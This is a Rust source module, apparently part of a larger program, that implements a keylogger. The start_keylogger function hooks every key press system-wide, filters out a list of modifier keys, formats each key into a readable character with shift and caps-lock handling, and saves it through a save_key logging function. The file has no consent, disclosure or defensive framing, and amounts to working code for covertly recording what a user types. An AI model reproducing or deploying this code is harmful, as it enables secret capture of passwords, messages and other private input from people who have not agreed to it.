use std::collections::HashSet;

use lazy_static::lazy_static;
use mki::{Action, Keyboard};
use regex::Regex;

use crate::debug_log;
use crate::log_file::save_key;

const MINUS: Keyboard = Keyboard::Other(189);
const EQUALS: Keyboard = Keyboard::Other(187);
const CONTEXT_MENU: Keyboard = Keyboard::Other(93);
const END: Keyboard = Keyboard::Other(35);

lazy_static! {
    static ref BLACKLISTED_KEYS: HashSet<Keyboard> = HashSet::from([Keyboard::LeftShift, Keyboard::RightShift, Keyboard::LeftAlt, Keyboard::RightAlt, Keyboard::Escape, Keyboard::PageUp, Keyboard::PageDown, Keyboard::NumLock, CONTEXT_MENU]);
    static ref NON_ASCII_REGEX: Regex = Regex::new("[^\\x20-\\x7F\\xA1-\\xFF]").unwrap();
}

/// Start listening for any key presses, saving them into the file
pub fn start_keylogger() {
    debug_log!("Hooking keylogger");
    mki::bind_any_key(Action::handle_kb(|key| {
        if BLACKLISTED_KEYS.contains(&key) {
            return;
        }
        let formatted_key = format_key(key);
        debug_log!("Some key pressed pressed: {}", formatted_key);
        save_key(&formatted_key);
    }));
    debug_log!("Hooked keylogger");
}

fn format_key(key: Keyboard) -> String {
    let is_shift_pressed = is_shift_pressed();
    let formatted_key = match key {
        Keyboard::Number1 if is_shift_pressed => "!".to_string(),
        Keyboard::Number2 if is_shift_pressed => "@".to_string(),
        Keyboard::Number3 if is_shift_pressed => "#".to_string(),
        Keyboard::Number4 if is_shift_pressed => "$".to_string(),
        Keyboard::Number5 if is_shift_pressed => "%".to_string(),
        Keyboard::Number6 if is_shift_pressed => "^".to_string(),
        Keyboard::Number7 if is_shift_pressed => "&".to_string(),
        Keyboard::Number8 if is_shift_pressed => "*".to_string(),
        Keyboard::Number9 if is_shift_pressed => "(".to_string(),
        Keyboard::Number0 if is_shift_pressed => ")".to_string(),
        MINUS if is_shift_pressed => "_".to_string(),
        EQUALS if is_shift_pressed => "+".to_string(),
        Keyboard::BackwardSlash if is_shift_pressed => "|".to_string(),
        Keyboard::LeftBrace if is_shift_pressed => "{".to_string(),
        Keyboard::RightBrace if is_shift_pressed => "}".to_string(),
        Keyboard::SemiColon if is_shift_pressed => ":".to_string(),
        Keyboard::Comma if is_shift_pressed => "<".to_string(),
        Keyboard::Period if is_shift_pressed => ">".to_string(),
        Keyboard::Slash if is_shift_pressed => "?".to_string(),
        Keyboard::Apostrophe if is_shift_pressed => '"'.to_string(),
        MINUS | Keyboard::Subtract => "-".to_string(),
        EQUALS => "=".to_string(),
        Keyboard::BackwardSlash => "\\".to_string(),
        Keyboard::LeftBrace => "[".to_string(),
        Keyboard::RightBrace => "]".to_string(),
        Keyboard::SemiColon => ";".to_string(),
        Keyboard::Comma => ",".to_string(),
        Keyboard::Period | Keyboard::Decimal => ".".to_string(),
        Keyboard::Slash | Keyboard::Divide => "/".to_string(),
        Keyboard::Apostrophe => "'".to_string(),
        Keyboard::Up => "↑".to_string(),
        Keyboard::Down => "↓".to_string(),
        Keyboard::Left => "←".to_string(),
        Keyboard::Right => "→".to_string(),
        Keyboard::Multiply => "*".to_string(),
        Keyboard::Add => "+".to_string(),
        END => "End".to_string(),
        Keyboard::LeftControl | Keyboard::RightControl => "Ctrl".to_string(),
        Keyboard::Space => " ".to_string(),
        _ => format!("{:?}", key),
    };

    if formatted_key.len() > 1 || NON_ASCII_REGEX.find(&formatted_key).is_some() {
        return format!("[{}]", formatted_key);
    }
    if formatted_key.starts_with("Number") || formatted_key.starts_with("Numpad") {
        return formatted_key.replace("Number", "")
    }
    if is_shift_pressed || Keyboard::CapsLock.is_toggled() {
        return formatted_key.to_uppercase();
    }
    formatted_key.to_lowercase()
}

fn is_shift_pressed() -> bool {
    Keyboard::LeftShift.is_pressed() || Keyboard::RightShift.is_pressed()
}